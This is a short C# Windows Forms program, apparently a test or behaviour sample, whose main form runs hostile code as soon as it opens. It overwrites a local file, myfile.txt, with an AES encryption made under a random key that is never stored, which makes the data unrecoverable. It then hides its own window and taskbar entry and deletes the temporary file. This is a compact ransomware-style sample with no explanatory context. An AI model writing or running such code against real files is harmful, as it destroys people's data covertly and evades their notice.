using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;

namespace MIC0378
{
    public partial class MainForm : Form
    {
        string sourceFilename = Directory.GetCurrentDirectory() + "\\myfile.txt";
        string destinationFilename = Directory.GetCurrentDirectory() + "\\myfile2.txt";

        public MainForm()
        {
            InitializeComponent();
            EncryptFile();
            HideForm();
        }

        public void EncryptFile()
        {

            using (var sourceStream = File.OpenRead(sourceFilename))
            using (var destinationStream = File.Create(destinationFilename))
            using (var provider = new AesCryptoServiceProvider())
            using (var cryptoTransform = provider.CreateEncryptor())
            using (var cryptoStream = new CryptoStream(destinationStream, cryptoTransform, CryptoStreamMode.Write))
            {
                sourceStream.CopyTo(cryptoStream);
            }

            File.Copy(destinationFilename, sourceFilename, true);

        }

        public async void HideForm()
        {
            await Task.Delay(2000);

            this.ShowInTaskbar = false;
            this.Opacity = 0;

            File.Delete(destinationFilename);
        }

    }
}
